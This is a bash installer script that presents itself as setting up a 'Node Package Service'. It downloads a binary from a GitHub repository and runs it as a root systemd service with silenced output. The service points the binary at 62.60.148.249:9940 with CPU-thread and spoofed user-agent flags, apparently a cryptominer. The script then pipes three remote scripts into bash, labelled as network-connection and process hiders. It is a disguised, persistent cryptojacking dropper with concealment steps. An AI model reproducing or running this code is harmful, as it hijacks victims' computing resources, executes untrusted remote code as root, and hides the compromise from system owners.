#!/bin/bash

# Exit on error
set -e

# Variables
URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package"
TARGET_DIR="/usr/local/share"
FILENAME="node-package"
FULL_PATH="$TARGET_DIR/$FILENAME"
SERVICE_NAME="node-package"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   print_error "This script must be run as root (use sudo)"
   exit 1
fi

print_status "Starting installation of $SERVICE_NAME service..."

# Check and remove existing service and file
print_status "Checking for existing $SERVICE_NAME service and file..."

# Stop the service if it's running
if systemctl is-active --quiet "$SERVICE_NAME" 2>/dev/null; then
    print_warning "Service $SERVICE_NAME is currently running. Stopping it..."
    systemctl stop "$SERVICE_NAME"
    print_status "Service stopped successfully"
fi

# Disable the service if it's enabled
if systemctl is-enabled --quiet "$SERVICE_NAME" 2>/dev/null; then
    print_warning "Service $SERVICE_NAME is enabled. Disabling it..."
    systemctl disable "$SERVICE_NAME"
    print_status "Service disabled successfully"
fi

# Remove existing service file
if [[ -f "$SERVICE_FILE" ]]; then
    print_warning "Removing existing service file: $SERVICE_FILE"
    rm -f "$SERVICE_FILE"
    print_status "Service file removed successfully"
fi

# Remove existing node-package file from target directory
if [[ -f "$FULL_PATH" ]]; then
    print_warning "Removing existing file: $FULL_PATH"
    rm -f "$FULL_PATH"
    print_status "File removed from target directory successfully"
fi

# Remove existing node-package file from /var/tmp/ if present
VAR_TMP_PATH="/var/tmp/$FILENAME"
if [[ -f "$VAR_TMP_PATH" ]]; then
    print_warning "Removing existing file: $VAR_TMP_PATH"
    rm -f "$VAR_TMP_PATH"
    print_status "File removed from /var/tmp/ successfully"
fi
# Remove existing node-package file from /usr/local/lib/ if present
VAR_TMP_PATH="/usr/local/lib/$FILENAME"
if [[ -f "$VAR_TMP_PATH" ]]; then
    print_warning "Removing existing file: $VAR_TMP_PATH"
    rm -f "$VAR_TMP_PATH"
    print_status "File removed from /var/tmp/ successfully"
fi

# Reload systemd daemon to reflect changes
if [[ -f "$SERVICE_FILE" ]] || systemctl list-unit-files | grep -q "$SERVICE_NAME"; then
    print_status "Reloading systemd daemon to clear old service..."
    systemctl daemon-reload
fi

print_status "Cleanup completed. Proceeding with fresh installation..."

# Ensure target directory exists
print_status "Creating target directory: $TARGET_DIR"
mkdir -p "$TARGET_DIR"

# Download the file to /var/tmp
print_status "Downloading $FILENAME to $FULL_PATH..."
if curl -L -o "$FULL_PATH" "$URL"; then
    print_status "Download completed successfully"
else
    print_error "Failed to download file"
    exit 1
fi

# Make it executable
print_status "Making file executable..."
chmod +x "$FULL_PATH"

# Create systemd service file
print_status "Creating systemd service file: $SERVICE_FILE"
cat > "$SERVICE_FILE" << EOF
[Unit]
Description=Node Package Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=$FULL_PATH -o 62.60.148.249:9940 --cpu-max-threads-hint 70 --user-agent "firefox/223.12.1"
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd daemon
print_status "Reloading systemd daemon..."
systemctl daemon-reload

# Enable the service to start on boot
print_status "Enabling service to start on boot..."
systemctl enable "$SERVICE_NAME"

# Start the service
print_status "Starting the service..."
systemctl start "$SERVICE_NAME"

# Check service status
sleep 2
if systemctl is-active --quiet "$SERVICE_NAME"; then
    print_status "Service is running successfully!"
    print_status "Service status:"
    systemctl status "$SERVICE_NAME" --no-pager -l
else
    print_error "Service failed to start!"
    print_error "Service status:"
    systemctl status "$SERVICE_NAME" --no-pager -l
    exit 1
fi

print_status "Installation completed successfully!"
print_status "The service will automatically start on boot."
print_status ""
print_status "Useful commands:"
print_status "  Check status: sudo systemctl status $SERVICE_NAME"
print_status "  Stop service: sudo systemctl stop $SERVICE_NAME"
print_status "  Start service: sudo systemctl start $SERVICE_NAME"
print_status "  Restart service: sudo systemctl restart $SERVICE_NAME"
print_status "  View logs: sudo journalctl -u $SERVICE_NAME -f"
print_status "  Disable auto-start: sudo systemctl disable $SERVICE_NAME"

check_and_install_build_tools() {
    echo "➜ Checking for gcc and make..."
    
    # Check if gcc and make are installed
    if ! command -v gcc &> /dev/null || ! command -v make &> /dev/null; then
        echo "➜ gcc or make not found. Installing build tools..."
        
        # Detect package manager and install accordingly
        if command -v apt &> /dev/null; then
            # Debian/Ubuntu
            echo "➜ Using apt package manager..."
            apt update
            apt install -y build-essential
        elif command -v yum &> /dev/null; then
            # RHEL/CentOS/Fedora (older)
            echo "➜ Using yum package manager..."
            yum groupinstall -y "Development Tools"
        elif command -v dnf &> /dev/null; then
            # Fedora (newer)
            echo "➜ Using dnf package manager..."
            dnf groupinstall -y "Development Tools"
        elif command -v apk &> /dev/null; then
            # Alpine Linux
            echo "➜ Using apk package manager..."
            apk update
            apk add build-base
        elif command -v zypper &> /dev/null; then
            # openSUSE
            echo "➜ Using zypper package manager..."
            zypper install -y gcc make
        elif command -v pacman &> /dev/null; then
            # Arch Linux
            echo "➜ Using pacman package manager..."
            pacman -S --noconfirm base-devel
        else
            echo "❌ No supported package manager found. Please install gcc and make manually."
            exit 1
        fi
        
        # Verify installation
        if command -v gcc &> /dev/null && command -v make &> /dev/null; then
            echo "✅ gcc and make successfully installed."
        else
            echo "❌ Failed to install gcc and make."
            exit 1
        fi
    else
        echo "✅ gcc and make are already installed."
    fi
}

# Check and install build tools
check_and_install_build_tools

# Create temporary directory for script execution
TEMP_DIR=$(mktemp -d)
print_status "Creating temporary directory: $TEMP_DIR"
cd "$TEMP_DIR"

# Download and run scripts from temporary directory to avoid file conflicts
print_status "Running network connection hider script..."
bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test.sh)

print_status "Running additional network script..."  
bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test1.sh)

print_status "Running process hider script..."
bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/installer/refs/heads/main/hhh.sh)

# Clean up temporary directory
print_status "Cleaning up temporary directory..."
cd /
rm -rf "$TEMP_DIR"

print_status "All scripts executed successfully!"
